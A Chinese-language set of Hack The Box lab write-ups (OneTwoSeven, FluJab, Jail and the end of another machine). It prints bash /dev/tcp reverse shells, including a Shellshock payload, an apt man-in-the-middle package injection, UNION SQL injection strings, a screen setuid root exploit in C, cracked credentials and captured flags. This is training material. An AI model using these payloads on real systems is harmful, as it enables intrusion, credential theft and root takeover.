也就是說它是個虛擬機的概念(?

![image](https://hackmd.io/_uploads/Hk4_P3KfC.png)

我在這裡發現了bastion_key 看檔案格式應該是ssh的密碼

![image](https://hackmd.io/_uploads/HJreO2KfR.png)

我先去找我們的ip 172.23.0.11
i found it from /proc/net/fib_trie
![image](https://hackmd.io/_uploads/rkPmchFMA.png)

然後在同個目錄下(跟ssh密鑰)的network
這裡可以發現，他建了兩個網路23、24

![image](https://hackmd.io/_uploads/ryIgo2KfA.png)

這張圖的來源到底是誰我找不到
但統整目前的情況很方便
我們對 Web 應用程式的請求透過 WAF 發送到連接埠 443，WAF 充當 calvin 的反向代理
但是我們利用剛剛的imagetragick技巧 waf沒有把我們擋下來
所以我們現在進來了
而從剛剛我們查ip的時候也可以看到似乎只有23的存在
那是因為24 is not live-host 應該只是管理員拿來測試忘記刪的
Than 現在我們要到bastion which i got the ssh key

![image](https://hackmd.io/_uploads/r1NVnntG0.png)

不確定有沒有用但我發現這個
root:Ib3!kTEvYw6*P7s

![image](https://hackmd.io/_uploads/BJrs1aYz0.png)

ssh key 要給他 600
然後要給他 -o PubkeyAcceptedKeyTypes=ssh-rsa
![image](https://hackmd.io/_uploads/B1KoLatzR.png)

### www-data

![image](https://hackmd.io/_uploads/Bk6WP6YGR.png)

這時候我們就可以戳戳看24

![image](https://hackmd.io/_uploads/ry8pPaFzA.png)
![image](https://hackmd.io/_uploads/BJZRvptfR.png)

感覺他的shellshock 漏洞也可以用用看
![image](https://hackmd.io/_uploads/SJTCdTYzA.png)

我傳看看reverse shell
wget -U '() { :;}; echo; /usr/bin/bash >& /dev/tcp/10.10.14.4/1234 0>&1' -O- http://172.24.0.2/cgi-bin/stats
他不讓我這樣做

![image](https://hackmd.io/_uploads/Sk88tatzC.png)

原因好像是因為他沒有這個檔案

![image](https://hackmd.io/_uploads/B1SatTYzC.png)

### user.txt

好ㄟ成功了

![image](https://hackmd.io/_uploads/rk0f56FfR.png)

學到新招了

![image](https://hackmd.io/_uploads/S1qR56Yz0.png)

但是用python還是比較穩
用bash他會不讓你用su輸入密碼==

![image](https://hackmd.io/_uploads/SJBC2RFzR.png)

8319c28b9073a2866652e140182f8a29

![image](https://hackmd.io/_uploads/ryhXTCYMR.png)


### spanishdancer

老樣子，先去看他的ssh

![image](https://hackmd.io/_uploads/S1tjyJqfR.png)

然後他的ssh看起來是要解密的(這樣等一下就可以用sudo ，如果有的話)

![image](https://hackmd.io/_uploads/rke5yJ5fA.png)

purple1
![image](https://hackmd.io/_uploads/HJF91k9fR.png)

我把原ssh key 用成rsa 變成檔案what 
(查這個真的搞超久，ssh一直出錯)
然後一樣要給他600

![image](https://hackmd.io/_uploads/HJ4NG15MC.png)

![image](https://hackmd.io/_uploads/rJ4cMk9GR.png)

### root.txt

從上面那張圖我們可以知道我們有自己得權限加上我們與docker
是同一個群組的
There's a very cool thing is 
我們可以不用通過sudo 就可以執行docker
Moreover 我們可以透過他來執行bash 來變成root

https://gtfobins.github.io/gtfobins/docker/#sudo
我們可以讓他在 /mnt 執行/bin/bash 來提權
或是自己建個檔案讓他掛在裡面也行

root
![image](https://hackmd.io/_uploads/ByzjNkqGA.png)

他的root.txt 不在 root裡
03e2aad460b51b28576ef55e0bcc763a

![image](https://hackmd.io/_uploads/H1qRNJ9G0.png)

### 總結

這題先是透過網頁漏洞去到後台
然後靠發現的shellshock 漏洞去到另一台裝置
然後在裡面發現ssh 再跑到另一台裝置
然後用ssh 隧道的方式 再跑去另一台裝置
途中有發現有兩條網路
然後用ssh 連到不同權限
總之最後是docker 的漏洞

---

## OneTwoSeven

![image](https://hackmd.io/_uploads/SymIU1qMR.png)

開了80,22,60080

![image](https://hackmd.io/_uploads/S1DgjyqG0.png)

從網頁上寫的提示以及我自己得測試，
不能掃目錄
不能用php ，但是存在chroot
他們還沒有用ipv6


Username: ots-kMjc4MjI
Password: d5d27822

![image](https://hackmd.io/_uploads/Sy0nleqMR.png)

我拿這串去連接sftp

![image](https://hackmd.io/_uploads/ByAaMxcz0.png)

我放了一個有123的檔案

![image](https://hackmd.io/_uploads/B1yTzlczC.png)

所以我就想說用link的方式看看是不是也能抓到資料

![image](https://hackmd.io/_uploads/Hkr7QeqMA.png)

`ots-yODc2NGQ:x:999:999:127.0.0.1:/home/web/ots-yODc2NGQ`
除了存在我以外還有一個別人
他的ip看起來是直接連到目標得host

![image](https://hackmd.io/_uploads/SyArXx9zC.png)

in order to know that
我決定要去看網頁的程式碼

他這邊就跑出來了
他的密碼是把ip轉乘md5 之後取前8碼
然後再轉乘base64
撇去base64 那個身分的密碼就是127.0.0.1轉成md5後取前八碼(f528764d)

f528764d624db129b32c21fbca0cb8d6

![image](https://hackmd.io/_uploads/Hk0YVxcGR.png)

### user.txt

把檔案get下來

![image](https://hackmd.io/_uploads/HyHJLg9GA.png)

acf910b696bca13d476c2a0b3876be6b

![image](https://hackmd.io/_uploads/SJIl8xczC.png)


### www-data

back to earlier

我剛剛有去看網頁
but 我link到的是 /var/www
我找到了一個login.php.swp 在 html-admin

`if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8')`
ots-admin：Homesweethome1

![image](https://hackmd.io/_uploads/HyaUwl5MA.png)


他給了帳密
![image](https://hackmd.io/_uploads/ryxglDgcMC.png)

並且如果不是從60080port進入的話程式就die
![image](https://hackmd.io/_uploads/BJEZwe5GC.png)


所以我用ssh 轉接到127.0.0.1 60080
![image](https://hackmd.io/_uploads/rJDpde9fR.png)

然後去看網頁

![image](https://hackmd.io/_uploads/B14etg5MC.png)

把剛剛拿到的帳密(有sha那個)輸入進去
![image](https://hackmd.io/_uploads/HJQvYlqGC.png)

往下滑可以有地方給你上傳

![image](https://hackmd.io/_uploads/HkMtKx5zA.png)

按下[DL]可以下載原始碼
其中這是 addon manager 的程式碼
這邊提到說
url中一定要有addon-upload.php
並且他跑完之後會丟給download那裏檢查
所以url裡面也要有他
如果兩個都要出現的話
可以把他當作像指令一樣

EX:127.0.0.1/addon-download.php?what=/addon-uploads.php

![image](https://hackmd.io/_uploads/BkFoAx9zC.png)

要記得先去網頁那裏，把按鈕的hidden刪了
然後用burpsuite 抓
改一點值跟型態還有url+你的command就好了

![image](https://hackmd.io/_uploads/Syof4Z9GC.png)

成功上傳

![image](https://hackmd.io/_uploads/H1wOEW5GA.png)

接著就是開監聽上傳reverse shell(還要再去造訪一次網頁)

bash -i >& /dev/tcp/10.10.14.4/1234 0>&1

![image](https://hackmd.io/_uploads/H1iIHbcG0.png)

www-data
![image](https://hackmd.io/_uploads/r1JKBbqzC.png)


### root.txt

可以透過 apt update  upgrade 來提權
![image](https://hackmd.io/_uploads/rkL2HW5fC.png)

先試試看update
他說失敗是因為APT嘗試解析 packages.onetwoseven.htb

![image](https://hackmd.io/_uploads/Byx2Schf0.png)

所以我們可以劫持他的流量來變成root

#### MiTM

之前有打過跟apt有關的
當時是寫一個apt的reverse shell
但現在這題不太一樣的是
似乎要讓他執行update之後還要upgrade
因為有些事情的權限的問題
所以不是執行其中一個就會成功
而這是我找到的方法
aka 中間人攻擊

https://versprite.com/vs-labs/apt-mitm-package-injection/

我先設我的proxy到環進變數裡
export http_proxy

![image](https://hackmd.io/_uploads/BJaeojhfC.png)


用burp suite 去當作proxy的轉接處
![image](https://hackmd.io/_uploads/Hkh21nnG0.png)
![image](https://hackmd.io/_uploads/H18aTj3GC.png)

然後把下面那句放在hosts裡
packages.onetwoseven.htb
![image](https://hackmd.io/_uploads/rJU90i2M0.png)

因為剛剛在burpsuite上有設定
開一個連接的地方

![image](https://hackmd.io/_uploads/H10rkn3fR.png)

接著可以去輸入sudo apt-get update
![image](https://hackmd.io/_uploads/SJ5-ehhzR.png)

再看自己的機器可以看到有攔截到東西
但是都沒有成功

![image](https://hackmd.io/_uploads/Hk4MlnhzA.png)

並且我們可以發現有個叫做devuan的資料夾
![image](https://hackmd.io/_uploads/ByaVbhhzC.png)

所以我先去查了一下
![image](https://hackmd.io/_uploads/S1q3Q33M0.png)

這裡有很多檔案
![image](https://hackmd.io/_uploads/rJv0X3nGR.png)

隨著抓到的封包給的路徑
可以找到原檔案

![image](https://hackmd.io/_uploads/r1fGN22M0.png)

把他載下來之後解壓縮
![image](https://hackmd.io/_uploads/S1JvHh2MA.png)

然後挑一個檔案設定
我挑這個

![image](https://hackmd.io/_uploads/SJqG8hhfA.png)

我用vim 把下面全刪了 隨便打個很大的數字然後按dd
然後用nano 編輯

![image](https://hackmd.io/_uploads/ryXU_n3fA.png)

改成這樣
![image](https://hackmd.io/_uploads/Skf6932GC.png)

https://github.com/mthbernardes/Derbie.git
由於他需要一個 control 檔跟 postinst檔
所以現在要來寫 control 檔
裡面要改成跟上面那個package檔一樣
![image](https://hackmd.io/_uploads/r1lDo22G0.png)

like this
![image](https://hackmd.io/_uploads/rJ5WkahGR.png)

另一個be like
![image](https://hackmd.io/_uploads/Hyhnya2MR.png)

然後很重要的一點是
要給他在相對應的目錄下
就等於說當在目標機器update的時候
他會找到我們這裡
然後安裝我們的東西
接著upgrade
就可以連到root

像是這樣，然後要給他755(那個github有寫)
![image](https://hackmd.io/_uploads/SynU4p2GR.png)
![image](https://hackmd.io/_uploads/r1cwNTnzC.png)

把他壓成檔
![image](https://hackmd.io/_uploads/ryGyrphzR.png)

看一下檔案大小
![image](https://hackmd.io/_uploads/S1qZSp3fA.png)

還有sha256
2101e8ccc91806afb8a88a35c4cf3b02f67e0c86f50768ebadb36ebb29e27a3d
![image](https://hackmd.io/_uploads/SJOSrT3G0.png)

把package 改成剛剛看到的數值
![image](https://hackmd.io/_uploads/S1Y_ra3z0.png)

然後壓縮他
![image](https://hackmd.io/_uploads/H1boS6nfC.png)

update之後發現他有抓到
![image](https://hackmd.io/_uploads/Hyx-Ua2fA.png)

所以我就開監聽
![image](https://hackmd.io/_uploads/SJCVIThGC.png)

upgrade之後確定有抓到
![image](https://hackmd.io/_uploads/Sy-oLphMA.png)

root
![image](https://hackmd.io/_uploads/rkApUahMR.png)

a401c9d7788715186fdd995d47df3455
![image](https://hackmd.io/_uploads/Sk7yPa2fC.png)

//上一題比較難的比較好玩

---

## FluJab

![image](https://hackmd.io/_uploads/rJuOua2GC.png)

他DNS爆出很多子網域(?

```javascript=
DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
```
![image](https://hackmd.io/_uploads/HJ3ZxAnf0.png)

```bash=
echo | openssl s_client -showcerts -servername 10.10.10.124 -connect 10.10.10.124:443 2>/dev/null | openssl x509 -inform pem -noout -text | grep DNS | tr "," "\n" | cut -d: -f2
```

![image](https://hackmd.io/_uploads/SJLIzqbQA.png)

先把他全加進host裡等等一個一個看
![image](https://hackmd.io/_uploads/S1QYXqZQA.png)

### 443

因為proxy設定問題
所以firefox一開就跑出來
可以看到打開來顯示的是錯誤

![image](https://hackmd.io/_uploads/BJ6UE9ZmC.png)

### clownware.htb (HOLE)

我猜是個兔子洞
因為裡面只有小丑圖的gif

![image](https://hackmd.io/_uploads/B1HpEcbQ0.png)

而且他會301到error

![image](https://hackmd.io/_uploads/rJI0ScW7A.png)

### sni147831.clownware.htb (HOLE)

![image](https://hackmd.io/_uploads/SyXrLqZ70.png)

### proxy.clownware.htb (HOLE)

![image](https://hackmd.io/_uploads/rkQK89bQ0.png)

### console.flujab.htb (HOLE)

![image](https://hackmd.io/_uploads/H1sSw9WQ0.png)

### sys.flujab.htb (HOLE)

![image](https://hackmd.io/_uploads/r15OwcWXC.png)

### smtp.flujab.htb

這個頁面有一個登入畫面

![image](https://hackmd.io/_uploads/r12aD9Z7R.png)
![image](https://hackmd.io/_uploads/rJWfF9bmR.png)

### vaccine4flu.htb (hole)

![image](https://hackmd.io/_uploads/By2Td5WQC.png)

### bestmedsupply.htb (HOLE)

這是一個買藥網站
![image](https://hackmd.io/_uploads/HyZqF9WmR.png)

基本上按鈕按下去就會被重訂向到小丑搖頭畫面

### custoomercare.megabank.htb (HOLE)

![image](https://hackmd.io/_uploads/BJIc55-7A.png)

### flowerzrus.htb (HOLE)

這個網頁只有html跟css 啥都沒有

![image](https://hackmd.io/_uploads/SJVPj5bmA.png)

### lowerzrus.htb (HOEL)

看電影(巧克力夢工廠的片段的樣子)
![image](https://hackmd.io/_uploads/Hy40s5bXR.png)

### meetspinz.htb (HOLE)

好色
![image](https://hackmd.io/_uploads/HyDS2cZmC.png)

### meetspinz.htb (HOLE)

這是什麼我還以為是駭客任務
![image](https://hackmd.io/_uploads/H1Ht25-QA.png)

### freeflujab.htb

這個網頁可以註冊
![image](https://hackmd.io/_uploads/Bkcgaq-X0.png)

還有登記要打疫苗
![image](https://hackmd.io/_uploads/HkoHaqb7R.png)

好像要特定的名字
![image](https://hackmd.io/_uploads/BkF365WmA.png)

### flujab.htb (HOLE)

![image](https://hackmd.io/_uploads/ry_z05ZXR.png)


基本上所有的頁面的網頁都長這樣
![image](https://hackmd.io/_uploads/HymXWjZXR.png)


### NEXT

大致都戳過了
只有兩個頁面有點用
但是我沒戳出甚麼東西
所以我打算看點頁面外的東西

depand on 我剛剛有亂輸東西
![image](https://hackmd.io/_uploads/SkZ4HsbXA.png)

看cookies 會多出一欄，而且有一欄的path是smtp_config
![image](https://hackmd.io/_uploads/HJzUriZQ0.png)
![image](https://hackmd.io/_uploads/rylMuobX0.png)


那欄decode之後長這樣
![image](https://hackmd.io/_uploads/ByI5BoZ7C.png)

下面的register最後面也有%3D
所以我也拿去decode
> 3f4c7a2a129c29be1c242fddd5f95cab=Null

![image](https://hackmd.io/_uploads/BkD-IjWXC.png)

而patient 那一欄應該是md5
> cd75a966abfbd8577cf436b9678c55db  -

![image](https://hackmd.io/_uploads/r1lvUjZ70.png)

進到smtp_config之後會被重訂向到denied
所以我開burp 去改它的cookies

先把MODE改成TRUE 後
![image](https://hackmd.io/_uploads/SJ5_KjWXA.png)

再丟上去

COOKIE改成 MODUS=Q29uZmlndXJlPVRydWU=
標頭路徑改成smtp_conig
then (原本有設定cookies在burp但都沒成功後面我都用手動的)

![image](https://hackmd.io/_uploads/BkgN2ib70.png)

下面有個白名單連結，好像只有我

![image](https://hackmd.io/_uploads/B1qazkQ7C.png)

所以我先在應該要讓他連到我得smtp?
但他只允許字串

![image](https://hackmd.io/_uploads/r1-aAo-7R.png)


所以我先開一個smtp的port
![image](https://hackmd.io/_uploads/BJDG71mXC.png)

然後把ip丟在字串那欄
![image](https://hackmd.io/_uploads/BJ9K-ymQA.png)

成功了
![image](https://hackmd.io/_uploads/HkN7EJQ7A.png)

先看看白名單的部分
好像沒啥特別的
而且我好像多加一次

![image](https://hackmd.io/_uploads/SySzKJXXA.png)

所以我打register 下手
我把它改成true 然後轉成base64

![image](https://hackmd.io/_uploads/ByXL5JQ7R.png)

可以看到cancel變了
![image](https://hackmd.io/_uploads/SJXq9k77R.png)

remind也變了
![image](https://hackmd.io/_uploads/rkIA517QR.png)

我試著傳東西
![image](https://hackmd.io/_uploads/H1P-jk7XA.png)

但他說我沒有提供信箱
![image](https://hackmd.io/_uploads/HyEXoyX70.png)

所以我就去cancel那裡試試看(我的smtp還沒關)
![image](https://hackmd.io/_uploads/BJCvikmm0.png)

可以看到他有回傳東西
![image](https://hackmd.io/_uploads/SkKZ3yXXR.png)

網頁跳出來的是
![image](https://hackmd.io/_uploads/H18m3J77C.png)

值得注意的是ref後面感覺是有東西的，可是它是空值
![image](https://hackmd.io/_uploads/r19xTJXm0.png)

所以我試試看或許是因為全都是0的關係
但試驗過後發現不是
![image](https://hackmd.io/_uploads/Sy9waJmQR.png)

接著我在他後面加一個單引號
沒有回傳但是網頁跑得很快
感覺可以試試看sqli

![image](https://hackmd.io/_uploads/B1Bm0JX7A.png)

輸入輸到5的時候終於回傳東西了
可以看到ref值後面接著3

![image](https://hackmd.io/_uploads/SkaACJXXA.png)

`nhsnum=NHS-000-000-0000'+UNION+SELECT+1,2,@@VERSION,4,5;+--+-&submit=Cancel+Appointment`
版本

![image](https://hackmd.io/_uploads/B14nlxXmC.png)

`nhsnum=NHS-000-000-0000'+UNION+SELECT+1,2,table_name,4,5+from+information_schema.tables+where+table_schema=database();+--+-&submit=Cancel+Appointment`
table name

![image](https://hackmd.io/_uploads/BkAU-l7X0.png)


`nhsnum=NHS-000-000-0000'+UNION+SELECT+1,2,column_name,4,5+from+information_schema.columns+where+table_schema=database()+and+table_name='admin';+--+-&submit=Cancel+Appointment`
第一欄的名稱

![image](https://hackmd.io/_uploads/Byi0Wl7mC.png)

`nhsnum=NHS-000-000-0000'+UNION+SELECT+1,2,column_name,4,5+from+information_schema.columns+where+table_schema=database()+and+table_name='admin'+and+column_name!='id';+--+-&submit=Cancel+Appointment`
第二欄的名稱

![image](https://hackmd.io/_uploads/H1o_flQmR.png)

`nhsnum=NHS-000-000-0000'+UNION+SELECT+1,2,column_name,4,5+from+information_schema.columns+where+table_schema=database()+and+table_name='admin'+and+column_name!='id'+and+column_name!='loginname';+--+-&submit=Cancel+Appointment`
第三欄的名稱

![image](https://hackmd.io/_uploads/SkcpGg77A.png)

`nhsnum=NHS-000-000-0000'+UNION+SELECT+1,2,column_name,4,5+from+information_schema.columns+where+table_schema=database()+and+table_name='admin'+and+column_name!='id'+and+column_name!='loginname'+and+column_name!='namelc';+--+-&submit=Cancel+Appointment`
第四欄的名稱

![image](https://hackmd.io/_uploads/HJ6zQxXXR.png)

`nhsnum=NHS-000-000-0000'+UNION+SELECT+1,2,column_name,4,5+from+information_schema.columns+where+table_schema=database()+and+table_name='admin'+and+column_name!='id'+and+column_name!='loginname'+and+column_name!='namelc'+and+column_name!='email';+--+-&submit=Cancel+Appointment`
第五欄的名稱

![image](https://hackmd.io/_uploads/BkYKmgX7R.png)

我覺得這樣的資訊應該夠了
但是沒有password
我往下leak也沒看到(下一個是creat)

`nhsnum=NHS-000-000-0000'+UNION+SELECT+1,2,CONCAT(loginname,':',namelc,':',password,':',email,':',access),4,5+FROM+admin;+--+-&submit=Cancel+Appointment&submit=Cancel+Appointment`
所以我自己加了
it work

> sysadm:administrator:a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:syadmin@flujab.htb:sysadmin-console-01.flujab.htb

![image](https://hackmd.io/_uploads/SkXqExQmC.png)

### get in shell

拿去解密後
sysadm:th3doct0r

![image](https://hackmd.io/_uploads/HkrbBx7m0.png)

我將sysadmin-console-01.flujab.htb加到hosts裡

?
![image](https://hackmd.io/_uploads/BynVIxmXA.png)

看來要8080才可以(具參考過的一些資料，一定要加進白名單才可以造訪這個網頁)
![image](https://hackmd.io/_uploads/ry2LUx7Q0.png)

拿剛剛獲得的帳密登進去
![image](https://hackmd.io/_uploads/ryhaPg7QC.png)

進去notepad可以開他檔案
因為他是連到他的伺服器裡的
所以open是開他檔案
![image](https://hackmd.io/_uploads/SkiDYgQ7C.png)

裡面只有drno存有ssh
![image](https://hackmd.io/_uploads/BkyQseXQA.png)

所以我打算去存取他的鑰匙
![image](https://hackmd.io/_uploads/HJWPolQXC.png)

但沒有成功
![image](https://hackmd.io/_uploads/SybFnxQQC.png)

所以我去/etc/ssh 看看有沒有甚麼其他的東西
我發現了好像是被廢棄的ssh鑰匙
還有個說明
裡面說不要重複使用鑰匙

![image](https://hackmd.io/_uploads/ByPyogmQ0.png)

然後我就找到重複使用的用戶了
![image](https://hackmd.io/_uploads/r1LP6gQXA.png)

我還不太知道要怎麼做
所以我先去查了他的kernal版本(找不到得可以直接去網址那裡打)
![image](https://hackmd.io/_uploads/HJ0ZgZ77A.png)

再去查他的cve
我發現了CVE-2008-0166
他是用亂數產生可預測的數字
這讓ssh可以被爆破
https://security-tracker.debian.org/tracker/CVE-2008-0166
https://github.com/g0tmi1k/debian-ssh

我先去看他的finger point
![image](https://hackmd.io/_uploads/SJ4VGbX7R.png)

然後把中間的冒號都刪掉
![image](https://hackmd.io/_uploads/rJyrNZmX0.png)

在上面可以看到他跑出4096
所以我去上面有貼的git中去到uncommon 找到4096
然後解壓縮他

裡面檔案超多
![image](https://hackmd.io/_uploads/Hk-wS-m7C.png)

透過把剛剛有整理好的md5 後面加上*
可以馬上找到密碼

![image](https://hackmd.io/_uploads/rJShr-m7R.png)

可是登入之後發現還是進不去
-v之後可以發現他其實沒連到
感覺是被擋下來了

![image](https://hackmd.io/_uploads/rJOCLbXXA.png)

我把我得ip加進hosts.allow中(但這樣沒成功)
![image](https://hackmd.io/_uploads/rJvx_ZQ7A.png)

所以我加看看all(結果成功了)
![image](https://hackmd.io/_uploads/BJgBubQmR.png)
![image](https://hackmd.io/_uploads/rkWKO-mX0.png)


### user.txt

不知道為甚麼不能顯示hostname

![image](https://hackmd.io/_uploads/rktqOWmQR.png)

728a7154a359ab7c4ef37e3e30d5c656
![image](https://hackmd.io/_uploads/HyuyF-7mA.png)

### root

他顯示我好像在受限制的shell中
https://xz.aliyun.com/t/7642?time__1311=n4%2BxnD0G0%3DG%3DeAK0QbDsA3OPxBixRl67DcYD&alichlgref=https%3A%2F%2Fwww.google.com%2F

![image](https://hackmd.io/_uploads/rywPtZQQA.png)

我選擇連ssh時加上-t bash
![image](https://hackmd.io/_uploads/Sk_ai-XQA.png)

光這樣好像不會動
所我還要修改我的路徑
`export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin`

接著我用find去找可以提權的檔案
我發現有兩個screen

![image](https://hackmd.io/_uploads/HkXv2WQ70.png)

他們的版本一樣
![image](https://hackmd.io/_uploads/ryvJTW7QC.png)

但他們的權限有一點不一樣
![image](https://hackmd.io/_uploads/SJ-SaZQX0.png)

當我直接執行的時候
他顯示要給他755 但我沒那個權限
![image](https://hackmd.io/_uploads/BJdZ8MmmA.png)

Then 我去查了screen 的版本
我發現他有個寫入的漏洞
好像是因為開發的時候不小心讓他可以寫入root檔
所以我找到了這個
https://github.com/XiphosResearch/exploits/blob/master/screen2root/screenroot.sh

我會把這兩個檔案傳過去然後讓他執行

```c=
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h> //chatgpt said that chmod needed it

__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

```c=
#include <stdio.h>
#include <unistd.h> //needed
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    char *args[] = {"/bin/sh", NULL}; //needed
    execvp("/bin/sh", args); //needed

}

```

我將它們上傳到機器上
![image](https://hackmd.io/_uploads/BkYQxmXQR.png)

我不確定他需不需要但我加了
![image](https://hackmd.io/_uploads/SkwM6QmQA.png)

痾結果是因為版本(我前面弄了很多版)
![image](https://hackmd.io/_uploads/ryDk0QQm0.png)

最後我查了論壇跟chatgpt
編譯的時候加上這個就好了 -static

root
![image](https://hackmd.io/_uploads/r1sCQ4m70.png)

05890898608a77ae324e1fed33c53ecb
![image](https://hackmd.io/_uploads/SJExENQmA.png)

---

## Jail

![image](https://hackmd.io/_uploads/r1v2ENmXA.png)

開了6個port
![image](https://hackmd.io/_uploads/BkCbdVXXA.png)
![image](https://hackmd.io/_uploads/SkSl_NQXA.png)

### port 80

我用這個掃到了一個目錄
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

![image](https://hackmd.io/_uploads/HJU-p8XQ0.png)


這裡有三個檔案
![image](https://hackmd.io/_uploads/Bys4TLm7A.png)

看起來是個登入還是什麼的程式
裡面有他的判段式
應該不會是要我們打pwn吧🤔
> admin:1974jailbreak!

![image](https://hackmd.io/_uploads/SkvvPDmQR.png)

### nfs

我記得這是一個共享資料夾的一個port
所以應該是可以掛載進去的

![image](https://hackmd.io/_uploads/BySbYv7m0.png)

所以我建一個資料夾，然後把他掛進去

![image](https://hackmd.io/_uploads/SyGpzKVXR.png)

裡面只有
/bin/cat /home/frank/logs/checkproc.log

![image](https://hackmd.io/_uploads/SkeUX7KVXA.png)

接著我去看另一個檔案
出現權限不足
應該是因為我掛載過去的身分應該只是1000

![image](https://hackmd.io/_uploads/rJK-U6V70.png)

我發現我可以建立檔案進去
裡面得檔案是空的
![image](https://hackmd.io/_uploads/ByCjUpVQR.png)

### jail

看來只能pwn進去了

可以看到他是一個 32位元的elf檔
![image](https://hackmd.io/_uploads/r1oMpCVX0.png)

裡面他有用到一個execstack
https://linux.die.net/man/8/execstack
https://www.anquanke.com/post/id/196095

這串指令是 32 位元 ，關閉保護模式 (應該是這樣翻譯)

![image](https://hackmd.io/_uploads/SJeNB0S7A.png)
![image](https://hackmd.io/_uploads/Sk7o8RS7C.png)

這意味著我可以對他用buffer overflow 來pwn他
![image](https://hackmd.io/_uploads/SJ3QpAEQC.png)

#### 程式碼

> admin:1974jailbreak!
> 如果是bebug模式可以輸入buffer

```c=
int debugmode;
int handle(int sock);
int auth(char *username, char *password);

int auth(char *username, char *password) {
    char userpass[16];
    char *response;
    if (debugmode == 1) {
        printf("Debug: userpass buffer @ %p\n", userpass);
        fflush(stdout);
    }
    if (strcmp(username, "admin") != 0) return 0;
    strcpy(userpass, password);
    if (strcmp(userpass, "1974jailbreak!") == 0) {
        return 1;
    } else {
        printf("Incorrect username and/or password.\n");
        return 0;
    }
    return 0;
}

```
開頭是user 跟pass 就可以繼續運行
或是debug mode 
如果不是gotuser & gotpass =1
就會直接break

debugmode = 1 也會直接break
這邊 buffer 1024
username 256
passsword 256

```c=

int handle(int sock) {
    int n;
    int gotuser = 0;
    int gotpass = 0;
    char buffer[1024];
    char strchr[2] = "\n\x00";
    char *token;
    char username[256];
    char password[256];
    debugmode = 0;
    memset(buffer, 0, 256);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);
    printf("OK Ready. Send USER command.\n");
    fflush(stdout);
    while(1) {
        n = read(sock, buffer, 1024);
        if (n < 0) {
            perror("ERROR reading from socket");
            return 0;
        }
        token = strtok(buffer, strchr);
        while (token != NULL) {
            if (gotuser == 1 && gotpass == 1) {
                break;
            }
            if (strncmp(token, "USER ", 5) == 0) {
                strncpy(username, token+5, sizeof(username));
                gotuser=1;
                if (gotpass == 0) {
                    printf("OK Send PASS command.\n");
                    fflush(stdout);
                }
            } else if (strncmp(token, "PASS ", 5) == 0) {
                strncpy(password, token+5, sizeof(password));
                gotpass=1;
                if (gotuser == 0) {
                    printf("OK Send USER command.\n");
                    fflush(stdout);
                }
            } else if (strncmp(token, "DEBUG", 5) == 0) {
                if (debugmode == 0) {
                    debugmode = 1;
                    printf("OK DEBUG mode on.\n");
                    fflush(stdout);
                } else if (debugmode == 1) {
                    debugmode = 0;
                    printf("OK DEBUG mode off.\n");
                    fflush(stdout);
                }
            }
            token = strtok(NULL, strchr);
        }
        if (gotuser == 1 && gotpass == 1) {
            break;
        }
    }
    
```

這裡單純只是如果輸入正確會print啥
錯誤會print啥
然後這裡會呼叫auth

```c=
    if (auth(username, password)) {
        printf("OK Authentication success. Send command.\n");
        fflush(stdout);
        n = read(sock, buffer, 1024);
        if (n < 0) {
            perror("Socket read error");
            return 0;
        }
        if (strncmp(buffer, "OPEN", 4) == 0) {
            printf("OK Jail doors opened.");
            fflush(stdout);
        } else if (strncmp(buffer, "CLOSE", 5) == 0) {
            printf("OK Jail doors closed.");
            fflush(stdout);
        } else {
            printf("ERR Invalid command.\n");
            fflush(stdout);
            return 1;
        }
    } else {
        printf("ERR Authentication failed.\n");
        fflush(stdout);
        return 0;
    }
    return 0;
}

```

port = 7411
唯一有用的訊息

```c=
int main(int argc, char *argv[]) {
    int sockfd;
    int newsockfd;
    int port;
    int clientlen;
    char buffer[256];
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    int n;
    int pid;
    int sockyes;
    sockyes = 1;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        exit(1);
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &sockyes, sizeof(int)) == -1) {
        perror("Setsockopt error");
        exit(1);
    }
    memset((char*)&server_addr, 0, sizeof(server_addr));
    port = 7411;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind error");
        exit(1);
    }
    listen(sockfd, 200);
    clientlen = sizeof(client_addr);
    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr*)&client_addr, &clientlen);
        if (newsockfd < 0) {
            perror("Accept error");
            exit(1);
        }
        pid = fork();
        if (pid < 0) {
            perror("Fork error");
            exit(1);
        }
        if (pid == 0) {
            close(sockfd);
            exit(handle(newsockfd));
        } else {
            close(newsockfd);
        }
    }
}
```

#### try

試試看 open
![image](https://hackmd.io/_uploads/HkaCW18QC.png)

試試看 close
![image](https://hackmd.io/_uploads/BkAMz18mC.png)

試試看debug mode 
他給了buffer的位置(?
0xffffd610

![image](https://hackmd.io/_uploads/r1nLfyU7R.png)

所以我們應該是可以直接用shellcode cover buffer的

#### try pwn

先給程式權限，然後再執行他

![image](https://hackmd.io/_uploads/HyzjyzI7C.png)

這個可以查有沒有掛到

![image](https://hackmd.io/_uploads/HyZ4zNUXA.png)

可以看到他在機器上有掛載

